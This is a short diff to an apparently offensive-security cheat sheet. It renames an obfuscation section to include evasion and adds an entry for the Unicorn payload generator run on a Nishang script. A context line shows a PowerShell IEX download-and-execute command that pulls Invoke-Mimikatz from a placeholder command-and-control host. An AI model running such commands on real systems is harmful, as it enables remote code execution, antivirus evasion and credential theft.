@@ -1839,7 +1839,7 @@ We can now request TGS service tickets to access network resources as this user
 
 
 
-## [](#header-2)Obfuscation Techniques 
+## [](#header-2)Obfuscation / Evasion Techniques 
 
 
 
@@ -1880,6 +1880,18 @@ IEX (New-Object Net.WebClient).DownloadString('http://c2server.com/Invoke-Mimika
 ```
 #https://github.com/danielbohannon/Invoke-DOSfuscation
 ```
+
+
+
+#### [](#header-4) Unicorn
+
+https://github.com/trustedsec/unicorn
+
+```
+unicorn.py Nishang.ps1
+```
+
+
 
 
 
